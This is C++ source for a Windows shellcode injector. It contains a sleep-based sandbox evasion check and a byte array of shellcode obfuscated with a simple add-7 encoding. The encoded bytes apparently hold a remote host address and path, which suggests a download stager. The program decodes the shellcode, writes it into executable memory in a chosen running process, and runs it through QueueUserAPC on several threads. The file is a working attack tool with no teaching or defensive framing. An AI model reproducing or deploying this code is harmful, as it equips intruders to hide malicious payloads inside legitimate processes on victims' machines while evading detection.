#include <iostream>
#include <windows.h>
#include <tlhelp32.h>

#define THREAD_INJECTION_LIMIT 4

int wmain(int argc, wchar_t** argv) {
    if (argc < 2) {
        std::wcout << "USAGE: " << argv[0] << " <proc_name>" << std::endl;
        return 1;
    }

    SYSTEMTIME starttime, finaltime;
    GetSystemTime(&starttime);
    Sleep(10000);
    GetSystemTime(&finaltime);
    if (abs(finaltime.wSecond - starttime.wSecond) < 9.5) {
        return 1;
    }

    unsigned char shellcode[] = { 0x3, 0x4f, 0x8a, 0xeb, 0xf7, 0xef, 0xd3, 0x7, 0x7, 0x7, 0x48, 0x58, 0x48, 0x57, 0x59, 0x4f, 0x38, 0xd9, 0x6c, 0x4f, 0x92, 0x59, 0x67, 0x58, 0x4f, 0x92, 0x59, 0x1f, 0x5d, 0x4f, 0x92, 0x59, 0x27, 0x54, 0x38, 0xd0, 0x4f, 0x16, 0xbe, 0x51, 0x51, 0x4f, 0x92, 0x79, 0x57, 0x4f, 0x38, 0xc7, 0xb3, 0x43, 0x68, 0x83, 0x9, 0x33, 0x27, 0x48, 0xc8, 0xd0, 0x14, 0x48, 0x8, 0xc8, 0xe9, 0xf4, 0x59, 0x48, 0x58, 0x4f, 0x92, 0x59, 0x27, 0x92, 0x49, 0x43, 0x4f, 0x8, 0xd7, 0x6d, 0x88, 0x7f, 0x1f, 0x12, 0x9, 0x16, 0x8c, 0x79, 0x7, 0x7, 0x7, 0x92, 0x87, 0x8f, 0x7, 0x7, 0x7, 0x4f, 0x8c, 0xc7, 0x7b, 0x6e, 0x4f, 0x8, 0xd7, 0x92, 0x4f, 0x1f, 0x57, 0x4b, 0x92, 0x47, 0x27, 0x50, 0x8, 0xd7, 0xea, 0x5d, 0x4f, 0x6, 0xd0, 0x48, 0x92, 0x3b, 0x8f, 0x54, 0x38, 0xd0, 0x4f, 0x8, 0xdd, 0x4f, 0x38, 0xc7, 0x48, 0xc8, 0xd0, 0x14, 0xb3, 0x48, 0x8, 0xc8, 0x3f, 0xe7, 0x7c, 0xf8, 0x53, 0xa, 0x53, 0x2b, 0xf, 0x4c, 0x40, 0xd8, 0x7c, 0xdf, 0x5f, 0x4b, 0x92, 0x47, 0x2b, 0x50, 0x8, 0xd7, 0x6d, 0x48, 0x92, 0x13, 0x4f, 0x4b, 0x92, 0x47, 0x23, 0x50, 0x8, 0xd7, 0x48, 0x92, 0xb, 0x8f, 0x4f, 0x8, 0xd7, 0x48, 0x5f, 0x48, 0x5f, 0x65, 0x60, 0x61, 0x48, 0x5f, 0x48, 0x60, 0x48, 0x61, 0x4f, 0x8a, 0xf3, 0x27, 0x48, 0x59, 0x6, 0xe7, 0x5f, 0x48, 0x60, 0x61, 0x4f, 0x92, 0x19, 0xf0, 0x52, 0x6, 0x6, 0x6, 0x64, 0x4f, 0x38, 0xe2, 0x5a, 0x50, 0xc5, 0x7e, 0x70, 0x75, 0x70, 0x75, 0x6c, 0x7b, 0x7, 0x48, 0x5d, 0x4f, 0x90, 0xe8, 0x50, 0xce, 0xc9, 0x53, 0x7e, 0x2d, 0xe, 0x6, 0xdc, 0x5a, 0x5a, 0x4f, 0x90, 0xe8, 0x5a, 0x61, 0x54, 0x38, 0xc7, 0x54, 0x38, 0xd0, 0x5a, 0x5a, 0x50, 0xc1, 0x41, 0x5d, 0x80, 0xae, 0x7, 0x7, 0x7, 0x7, 0x6, 0xdc, 0xef, 0x15, 0x7, 0x7, 0x7, 0x38, 0x40, 0x39, 0x35, 0x38, 0x3d, 0x3f, 0x35, 0x38, 0x37, 0x37, 0x35, 0x39, 0x7, 0x61, 0x4f, 0x90, 0xc8, 0x50, 0xce, 0xc7, 0xc2, 0x8, 0x7, 0x7, 0x54, 0x38, 0xd0, 0x5a, 0x5a, 0x71, 0xa, 0x5a, 0x50, 0xc1, 0x5e, 0x90, 0xa6, 0xcd, 0x7, 0x7, 0x7, 0x7, 0x6, 0xdc, 0xef, 0xb4, 0x7, 0x7, 0x7, 0x36, 0x52, 0x7d, 0x7b, 0x7b, 0x70, 0x5c, 0x5b, 0x5d, 0x54, 0x80, 0x71, 0x3b, 0x3b, 0x57, 0x75, 0x70, 0x74, 0x6e, 0x6a, 0x5b, 0x3c, 0x6e, 0x78, 0x72, 0x7d, 0x7c, 0x81, 0x7f, 0x6f, 0x80, 0x7d, 0x58, 0x49, 0x6f, 0x5b, 0x4f, 0x5e, 0x52, 0x68, 0x38, 0x3c, 0x7f, 0x4b, 0x70, 0x57, 0x40, 0x78, 0x6b, 0x4c, 0x48, 0x50, 0x55, 0x37, 0x78, 0x61, 0x80, 0x57, 0x59, 0x34, 0x4b, 0x52, 0x57, 0x3b, 0x55, 0x73, 0x34, 0x6e, 0x6e, 0x55, 0x34, 0x3c, 0x3d, 0x52, 0x51, 0x78, 0x6b, 0x4f, 0x4b, 0x3f, 0x50, 0x4c, 0x81, 0x5e, 0x3b, 0x39, 0x57, 0x71, 0x34, 0x66, 0x37, 0x3b, 0x61, 0x76, 0x58, 0x5f, 0x3e, 0x72, 0x56, 0x5e, 0x7a, 0x80, 0x50, 0x80, 0x4e, 0x51, 0x6b, 0x4c, 0x7f, 0x48, 0x60, 0x5f, 0x55, 0x4b, 0x5a, 0x76, 0x6c, 0x5b, 0x68, 0x57, 0x4e, 0x6e, 0x81, 0x4e, 0x5b, 0x76, 0x73, 0x61, 0x71, 0x34, 0x3b, 0x38, 0x73, 0x81, 0x54, 0x68, 0x75, 0x6b, 0x68, 0x3b, 0x72, 0x3e, 0x70, 0x5c, 0x6d, 0x5d, 0x38, 0x6a, 0x81, 0x49, 0x54, 0x3e, 0x6c, 0x5d, 0x51, 0x7d, 0x49, 0x55, 0x69, 0x38, 0x3b, 0x3e, 0x72, 0x81, 0x56, 0x4c, 0x55, 0x56, 0x56, 0x3d, 0x6f, 0x79, 0x7, 0x4f, 0x90, 0xc8, 0x5a, 0x61, 0x48, 0x5f, 0x54, 0x38, 0xd0, 0x5a, 0x4f, 0xbf, 0x7, 0x39, 0xaf, 0x8b, 0x7, 0x7, 0x7, 0x7, 0x57, 0x5a, 0x5a, 0x50, 0xce, 0xc9, 0xf2, 0x5c, 0x35, 0x42, 0x6, 0xdc, 0x4f, 0x90, 0xcd, 0x71, 0x11, 0x66, 0x4f, 0x90, 0xf8, 0x71, 0x26, 0x61, 0x59, 0x6f, 0x87, 0x3a, 0x7, 0x7, 0x50, 0x90, 0xe7, 0x71, 0xb, 0x48, 0x60, 0x50, 0xc1, 0x7c, 0x4d, 0xa5, 0x8d, 0x7, 0x7, 0x7, 0x7, 0x6, 0xdc, 0x54, 0x38, 0xc7, 0x5a, 0x61, 0x4f, 0x90, 0xf8, 0x54, 0x38, 0xd0, 0x54, 0x38, 0xd0, 0x5a, 0x5a, 0x50, 0xce, 0xc9, 0x34, 0xd, 0x1f, 0x82, 0x6, 0xdc, 0x8c, 0xc7, 0x7c, 0x26, 0x4f, 0xce, 0xc8, 0x8f, 0x1a, 0x7, 0x7, 0x50, 0xc1, 0x4b, 0xf7, 0x3c, 0xe7, 0x7, 0x7, 0x7, 0x7, 0x6, 0xdc, 0x4f, 0x6, 0xd6, 0x7b, 0x9, 0xf2, 0xb1, 0xef, 0x5c, 0x7, 0x7, 0x7, 0x5a, 0x60, 0x71, 0x47, 0x61, 0x50, 0x90, 0xd8, 0xc8, 0xe9, 0x17, 0x50, 0xce, 0xc7, 0x7, 0x17, 0x7, 0x7, 0x50, 0xc1, 0x5f, 0xab, 0x5a, 0xec, 0x7, 0x7, 0x7, 0x7, 0x6, 0xdc, 0x4f, 0x9a, 0x5a, 0x5a, 0x4f, 0x90, 0xee, 0x4f, 0x90, 0xf8, 0x4f, 0x90, 0xe1, 0x50, 0xce, 0xc7, 0x7, 0x27, 0x7, 0x7, 0x50, 0x90, 00, 0x50, 0xc1, 0x19, 0x9d, 0x90, 0xe9, 0x7, 0x7, 0x7, 0x7, 0x6, 0xdc, 0x4f, 0x8a, 0xcb, 0x27, 0x8c, 0xc7, 0x7b, 0xb9, 0x6d, 0x92, 0xe, 0x4f, 0x8, 0xca, 0x8c, 0xc7, 0x7c, 0xd9, 0x5f, 0xca, 0x5f, 0x71, 0x7, 0x60, 0xc2, 0xe7, 0x24, 0x31, 0x11, 0x48, 0x90, 0xe1, 0x6, 0xdc, 0x7 };

    for (unsigned int i = 0; i < sizeof shellcode; i++) {
        shellcode[i] -= 7;
    }

    std::wcout << "[+] Getting list of active processes..." << std::endl;

    // Creating ToolHelp32 to search through all the processes
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        std::wcout << "[-] Error in getting list of active processes" << std::endl;
        return 1;
    }

    PROCESSENTRY32 procEntry;
    procEntry.dwSize = sizeof(PROCESSENTRY32);

    // Searching for the process whose name is pointed by argv[1]
    // By default, if it doesn't find it, the process chosen will be the injector itself
    std::wcout << "[+] Trying to find " << argv[1] << " in the list..." << std::endl;
    for (auto proc = Process32First(hSnapshot, &procEntry); proc; proc = Process32Next(hSnapshot, &procEntry)) {
        if (!lstrcmpW(argv[1], procEntry.szExeFile)) {
            break;
        }
    }

    if (!lstrcmpW(argv[1], procEntry.szExeFile)) {
        std::wcout << "[+] Found process " << procEntry.szExeFile << " with PID " << procEntry.th32ProcessID << std::endl;
    }
    else {
        std::wcout << "[~] No process " << argv[1] << " found. Why not try explorer.exe?" << std::endl;
        return 1;
    }

    CloseHandle(hSnapshot);

    HANDLE hProcess = NULL;
    SIZE_T lpNumberOfBytesWritten;

    // Opening process pointed by procEntry.th32ProcessID
    std::wcout << "[+] Opening chosen process..." << std::endl;
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, procEntry.th32ProcessID);
    if (hProcess == INVALID_HANDLE_VALUE) {
        std::wcout << "[-] Error opening process " << procEntry.th32ProcessID << std::endl;
        return 1;
    }


    // Allocating memory in remote process
    std::wcout << "[+] Allocating " << sizeof(shellcode) << " bytes in remote process.." << std::endl;
    LPVOID allocatedMem = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!allocatedMem) {
        std::wcout << "[-] Error in allocating memory" << std::endl;
        return 1;
    }


    // Writing shellcode to allocated memory
    std::wcout << "[+] Writing shellcode at 0x" << std::hex << allocatedMem << std::endl;
    BOOL status = WriteProcessMemory(hProcess, allocatedMem, shellcode, sizeof(shellcode), &lpNumberOfBytesWritten);
    if (!status) {
        std::wcout << "[-] Error in writing shellcode" << std::endl;
        return 1;
    }


    // List all threads in all processes
    std::wcout << "[+] Getting list of all threads in the system..." << std::endl;
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        std::wcout << "[-] Error in getting list of active threads" << std::endl;
        return 1;
    }

    THREADENTRY32 threadEntry;
    threadEntry.dwSize = sizeof(THREADENTRY32);

    // Finally, call QueueUserAPC to the main thread
    std::wcout << "[+] Getting list of active threads in target process..." << std::endl;

    unsigned int i = 0;
    for (auto thread = Thread32First(hSnapshot, &threadEntry); thread && i < THREAD_INJECTION_LIMIT; thread = Thread32Next(hSnapshot, &threadEntry)) {
        if (threadEntry.th32OwnerProcessID == procEntry.th32ProcessID) {
            // Code for queueing APC to main thread
            HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, 0, threadEntry.th32ThreadID);
            if (!hThread) {
                std::wcout << "[-] Failed opening thread " << threadEntry.th32ThreadID << std::endl;
                continue;
            }

            std::wcout << "[+] Queueing APC for thread " << threadEntry.th32ThreadID << "..." << std::endl;
            QueueUserAPC((PAPCFUNC)allocatedMem, hThread, NULL);
            i++;
        }

    }
}
